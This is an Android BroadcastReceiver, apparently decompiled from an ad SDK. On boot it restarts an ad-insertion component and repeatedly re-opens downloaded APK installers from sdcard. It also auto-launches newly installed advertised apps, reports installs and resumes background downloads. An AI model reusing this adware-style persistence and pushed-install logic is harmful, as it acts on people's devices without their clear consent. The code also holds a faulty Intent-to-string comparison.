package com.bangbang.ads.android;
import java.io.File;
import java.util.Map;
import workspace.mixsdk.DownloadUtils;
import workspace.mixsdk.InsertUtil;
import workspace.util.CommonUtils;
import workspace.util.MyLogger;
import workspace.util.ReportUtils;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.ConnectivityManager;

public class BoxaReceiver extends BroadcastReceiver {
    private static void present() {
        Context context = CONTEXT.getApplicationContext();
        SharedPreferences pref = context.getSharedPreferences("downLoadFileName", 0);
        Editor editor = pref.edit();
        Map<String, ?> map = pref.getAll();
        long preTime = pref.getLong("preTime", 0L);
        long l1 = (System.currentTimeMillis() - preTime) / 0x36ee80L;
        int times = pref.getInt("times", 0);
        if (times != 0 && l1 < 4L) { return; }
        if (map.size() <= 3) { return; }
        for (String key : map.keySet()) {
            if (!key.equals("isFirst") && !key.equals("times") && !key.equals("preTime")) {
                String value = (String) map.get(key);
                File file = new File(new StringBuilder("sdcard/").append(value).toString());
                if (!CommonUtils.apkExits(context, key) && file.exists()) {
                    editor.putLong("preTime", System.currentTimeMillis());
                    editor.putInt("times", times + 1);
                    editor.commit();
                    CommonUtils.openFile(context, file, key);
                }
            }
        }
        editor.putLong("preTime", System.currentTimeMillis());
        editor.commit();
        return;
    }
    private static void restartInsert() {
        new InsertUtil().start(CONTEXT.getApplicationContext());
    }
    private static void startActivity(String targetPackageName) {
        CONTEXT.getSharedPreferences("CheckInit", 0);
        SharedPreferences pref1 = CONTEXT.getSharedPreferences("downLoadApkPackageName", 0);
        Editor downLoadApkPackageNameEditor = pref1.edit();
        Editor downLoadApkEditor = CONTEXT.getSharedPreferences("downLoadApk", 0).edit();
        Map<String, ?> map = pref1.getAll();
        for (String key : map.keySet()) {
            String packageName = (String) map.get(key);
            int adId = Integer.parseInt(key);
            if (targetPackageName.equals(packageName)) {
                ((NotificationManager) CONTEXT.getSystemService("notification")).cancel(adId);
                downLoadApkEditor.remove(key);
                downLoadApkEditor.commit();
                downLoadApkPackageNameEditor.remove(key);
                downLoadApkPackageNameEditor.commit();
                ReportUtils.apkInstalledReport();
                Intent intent = CONTEXT.getPackageManager().getLaunchIntentForPackage(packageName);
                CONTEXT.startActivity(intent);
                return;
            }
        }
    }
    private static void stopDownLoading() {
        DownloadUtils.StopDownLoading();
    }
    private static Context CONTEXT;
    private static File FILE;
    private static String JAR_NAME;
    private static Intent INTENT;
    @Override
    public void onReceive(Context context, Intent intent) {
        CONTEXT = context;
        INTENT = intent;
        String action = INTENT.getAction();
        JAR_NAME = CONTEXT.getSharedPreferences("MixVersion", 0).getString("jarName", "");
        if (action.equals("android.intent.action.PACKAGE_ADDED")) {
            MyLogger.info("info", "android.intent.action.PACKAGE_ADDED=======");
            String packageName = INTENT.getDataString().substring(8);
            MyLogger.info("info", new StringBuilder("pckName+:").append(packageName).toString());
            startActivity(packageName);
        }
        if (action.equals("android.intent.action.BOOT_COMPLETED") || INTENT.equals("android.intent.action.USER_PRESENT")) {
            MyLogger.info("info", "android.intent.action.USER_PRESENT");
            FILE = new File(CONTEXT.getFilesDir(), JAR_NAME);
            if (FILE.exists()) {
                restartInsert();
                present();
            }
        }
        ConnectivityManager manager = (ConnectivityManager) CONTEXT.getSystemService("connectivity");
        android.net.NetworkInfo.State state = manager.getNetworkInfo(1).getState();
        android.net.NetworkInfo.State state1 = manager.getNetworkInfo(0).getState();
        if (state != null && state1 != null && android.net.NetworkInfo.State.CONNECTED != state && android.net.NetworkInfo.State.CONNECTED == state1) {
            DownloadUtils.reDownLoading();
        } else {
            if (state != null && state1 != null && android.net.NetworkInfo.State.CONNECTED != state && android.net.NetworkInfo.State.CONNECTED != state1) {
                stopDownLoading();
                return;
            }
            if (state != null && android.net.NetworkInfo.State.CONNECTED == state) {
                DownloadUtils.reDownLoading();
                return;
            }
        }
    }
}
